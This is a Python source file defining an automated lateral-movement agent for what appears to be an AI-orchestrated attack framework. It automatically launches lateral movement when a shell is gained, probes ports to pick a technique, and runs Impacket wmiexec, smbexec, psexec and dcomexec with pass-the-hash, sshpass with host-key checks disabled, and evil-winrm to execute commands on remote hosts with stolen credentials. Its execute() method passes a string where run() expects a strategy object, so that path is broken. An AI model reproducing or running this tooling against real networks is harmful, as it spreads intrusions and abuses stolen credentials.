"""
Enhanced Lateral Movement Agent
ขยายความสามารถในการเคลื่อนย้ายข้ามระบบด้วยเทคนิคหลากหลาย
"""

import asyncio
from core.data_models import AgentData, Strategy
import logging
import time
import os
import base64
from typing import Dict, List, Optional, Any
from pathlib import Path

from core.base_agent import BaseAgent
from core.data_models import LateralMovementReport, Strategy, AttackPhase, ErrorType
from core.context_manager import ContextManager
from core.logger import log
from config import settings


class EnhancedLateralMovementAgent(BaseAgent):
    """
    Enhanced Lateral Movement Agent with multiple techniques:
    - WMI Execution (wmiexec)
    - SMB Execution (smbexec)
    - PSExec
    - SSH Lateral Movement
    - RDP Lateral Movement
    - Pass-the-Hash (PTH)
    - Pass-the-Ticket (PTT)
    - Overpass-the-Hash
    - Token Impersonation
    - DCOM Execution
    """
    
    supported_phases = [AttackPhase.LATERAL_MOVEMENT]
    
    def __init__(self, context_manager: ContextManager = None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.report_class = LateralMovementReport
        
        # Technique priorities (higher = better)
        self.technique_priorities = {
            'wmiexec': 10,
            'smbexec': 9,
            'psexec': 8,
            'dcom': 7,
            'ssh': 6,
            'rdp': 5,
            'winrm': 4
        }
        
    async def setup(self):
        """Asynchronous setup method"""
        if self.orchestrator and hasattr(self.orchestrator, 'pubsub_manager'):
            self.pubsub_manager = self.orchestrator.pubsub_manager
            await self.pubsub_manager.subscribe("exploit_events", self._handle_exploit_event)
    
    async def _handle_exploit_event(self, message: dict):
        """Callback for exploit_events"""
        log.info(f"[EnhancedLateralMovement] Received exploit event: {message}")
        
        if message.get("event_type") == "EXPLOIT_SUCCESS":
            shell_id = message.get("shell_id")
            if shell_id:
                log.info(f"[EnhancedLateralMovement] New shell {shell_id} - initiating lateral movement")
                
                new_strategy = Strategy(
                    phase=AttackPhase.LATERAL_MOVEMENT,
                    next_agent="EnhancedLateralMovementAgent",
                    directive=f"Perform advanced lateral movement from shell {shell_id}",
                    context={"shell_id": shell_id}
                )
                
                if self.orchestrator and hasattr(self.orchestrator, 'inject_strategy'):
                    await self.orchestrator.inject_strategy(new_strategy)
                    log.info(f"[EnhancedLateralMovement] Strategy injected for shell {shell_id}")
    
    async def run(self, strategy: Strategy, **kwargs) -> LateralMovementReport:
        """Main execution method"""
        start_time = time.time()
        
        # Extract context
        target_host = strategy.context.get("target_host")
        technique = strategy.context.get("technique", "auto")  # auto-select best technique
        command = strategy.context.get("command", "whoami")
        
        # Credentials
        username = strategy.context.get("username")
        password = strategy.context.get("password")
        ntlm_hash = strategy.context.get("hash")
        domain = strategy.context.get("domain", "")
        
        if not target_host:
            return self._error_report(start_time, "Missing target_host", ErrorType.CONFIGURATION)
        
        if not username:
            return self._error_report(start_time, "Missing username", ErrorType.CONFIGURATION)
        
        if not (password or ntlm_hash):
            return self._error_report(start_time, "Missing password or hash", ErrorType.CONFIGURATION)
        
        log.info(f"[EnhancedLateralMovement] Target: {target_host}, Technique: {technique}")
        
        # Auto-select technique if needed
        if technique == "auto":
            technique = await self._select_best_technique(target_host, strategy.context)
            log.info(f"[EnhancedLateralMovement] Auto-selected technique: {technique}")
        
        # Execute based on technique
        try:
            if technique == "wmiexec":
                result = await self._wmiexec(target_host, username, password, ntlm_hash, domain, command)
            elif technique == "smbexec":
                result = await self._smbexec(target_host, username, password, ntlm_hash, domain, command)
            elif technique == "psexec":
                result = await self._psexec(target_host, username, password, ntlm_hash, domain, command)
            elif technique == "dcom":
                result = await self._dcom_exec(target_host, username, password, ntlm_hash, domain, command)
            elif technique == "ssh":
                result = await self._ssh_exec(target_host, username, password, command)
            elif technique == "winrm":
                result = await self._winrm_exec(target_host, username, password, domain, command)
            else:
                return self._error_report(start_time, f"Unknown technique: {technique}", ErrorType.CONFIGURATION)
            
            end_time = time.time()
            
            if result.get("success"):
                log.success(f"[EnhancedLateralMovement] {technique} succeeded on {target_host}")
                return LateralMovementReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    summary=f"Lateral movement via {technique} successful on {target_host}",
                    data={
                        "technique": technique,
                        "target": target_host,
                        "output": result.get("output", ""),
                        "command": command
                    }
                )
            else:
                log.error(f"[EnhancedLateralMovement] {technique} failed on {target_host}")
                return LateralMovementReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    summary=f"Lateral movement via {technique} failed on {target_host}",
                    errors=[result.get("error", "Unknown error")],
                    error_type=ErrorType.LOGIC
                )
        
        except Exception as e:
            log.error(f"[EnhancedLateralMovement] Exception: {e}")
            return self._error_report(start_time, str(e), ErrorType.LOGIC)
    
    async def _select_best_technique(self, target_host: str, context: Dict) -> str:
        """Auto-select best lateral movement technique"""
        
        # Check if Windows or Linux
        is_windows = await self._is_windows_target(target_host)
        
        if is_windows:
            # Prefer WMI for Windows
            if await self._check_port_open(target_host, 135):  # WMI port
                return "wmiexec"
            elif await self._check_port_open(target_host, 445):  # SMB port
                return "smbexec"
            elif await self._check_port_open(target_host, 5985):  # WinRM port
                return "winrm"
            else:
                return "psexec"  # Fallback
        else:
            # Linux - prefer SSH
            if await self._check_port_open(target_host, 22):
                return "ssh"
            else:
                return "wmiexec"  # Try anyway
    
    async def _is_windows_target(self, target_host: str) -> bool:
        """Check if target is Windows"""
        # Try SMB port (445) - Windows specific
        return await self._check_port_open(target_host, 445)
    
    async def _check_port_open(self, host: str, port: int, timeout: float = 2.0) -> bool:
        """Check if a port is open"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False
    
    async def _wmiexec(self, target: str, username: str, password: str, 
                       ntlm_hash: str, domain: str, command: str) -> Dict:
        """Execute command via WMI"""
        
        impacket_path = getattr(settings, 'IMPACKET_PATH', '/usr/share/impacket')
        
        cmd = ["python3", f"{impacket_path}/wmiexec.py"]
        
        # Credentials
        cred_string = f"{domain}/{username}" if domain else username
        
        if ntlm_hash:
            cmd.extend(["-hashes", f":{ntlm_hash}"])
            cmd.append(cred_string)
        else:
            cmd.append(f"{cred_string}:{password}")
        
        cmd.extend([f"@{target}", command])
        
        return await self._execute_impacket_command(cmd)
    
    async def _smbexec(self, target: str, username: str, password: str,
                       ntlm_hash: str, domain: str, command: str) -> Dict:
        """Execute command via SMB"""
        
        impacket_path = getattr(settings, 'IMPACKET_PATH', '/usr/share/impacket')
        
        cmd = ["python3", f"{impacket_path}/smbexec.py"]
        
        cred_string = f"{domain}/{username}" if domain else username
        
        if ntlm_hash:
            cmd.extend(["-hashes", f":{ntlm_hash}"])
            cmd.append(cred_string)
        else:
            cmd.append(f"{cred_string}:{password}")
        
        cmd.extend([f"@{target}", command])
        
        return await self._execute_impacket_command(cmd)
    
    async def _psexec(self, target: str, username: str, password: str,
                      ntlm_hash: str, domain: str, command: str) -> Dict:
        """Execute command via PSExec"""
        
        impacket_path = getattr(settings, 'IMPACKET_PATH', '/usr/share/impacket')
        
        cmd = ["python3", f"{impacket_path}/psexec.py"]
        
        cred_string = f"{domain}/{username}" if domain else username
        
        if ntlm_hash:
            cmd.extend(["-hashes", f":{ntlm_hash}"])
            cmd.append(cred_string)
        else:
            cmd.append(f"{cred_string}:{password}")
        
        cmd.extend([f"@{target}", command])
        
        return await self._execute_impacket_command(cmd)
    
    async def _dcom_exec(self, target: str, username: str, password: str,
                         ntlm_hash: str, domain: str, command: str) -> Dict:
        """Execute command via DCOM"""
        
        impacket_path = getattr(settings, 'IMPACKET_PATH', '/usr/share/impacket')
        
        cmd = ["python3", f"{impacket_path}/dcomexec.py"]
        
        cred_string = f"{domain}/{username}" if domain else username
        
        if ntlm_hash:
            cmd.extend(["-hashes", f":{ntlm_hash}"])
            cmd.append(cred_string)
        else:
            cmd.append(f"{cred_string}:{password}")
        
        cmd.extend([f"@{target}", command])
        
        return await self._execute_impacket_command(cmd)
    
    async def _ssh_exec(self, target: str, username: str, password: str, command: str) -> Dict:
        """Execute command via SSH"""
        
        cmd = [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            f"{username}@{target}",
            command
        ]
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "output": stdout.decode(errors='ignore')
                }
            else:
                return {
                    "success": False,
                    "error": stderr.decode(errors='ignore')
                }
        
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def _winrm_exec(self, target: str, username: str, password: str,
                          domain: str, command: str) -> Dict:
        """Execute command via WinRM"""
        
        try:
            # Using evil-winrm or pywinrm
            cmd = [
                "evil-winrm",
                "-i", target,
                "-u", username,
                "-p", password
            ]
            
            if domain:
                cmd.extend(["-d", domain])
            
            cmd.extend(["-c", command])
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "output": stdout.decode(errors='ignore')
                }
            else:
                return {
                    "success": False,
                    "error": stderr.decode(errors='ignore')
                }
        
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def _execute_impacket_command(self, cmd: List[str]) -> Dict:
        """Execute Impacket command"""
        
        try:
            log.info(f"[EnhancedLateralMovement] Executing: {' '.join(cmd)}")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
            
            stdout_str = stdout.decode(errors='ignore')
            stderr_str = stderr.decode(errors='ignore')
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "output": stdout_str
                }
            else:
                return {
                    "success": False,
                    "error": stderr_str
                }
        
        except asyncio.TimeoutError:
            return {"success": False, "error": "Command timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute lateral movement agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _error_report(self, start_time: float, error_msg: str, error_type: ErrorType) -> LateralMovementReport:
        """Create error report"""
        return LateralMovementReport(
            agent_name=self.__class__.__name__,
            start_time=start_time,
            end_time=time.time(),
            summary=f"Lateral movement failed: {error_msg}",
            errors=[error_msg],
            error_type=error_type
        )


# Backward compatibility alias
LateralMovementAgent = EnhancedLateralMovementAgent
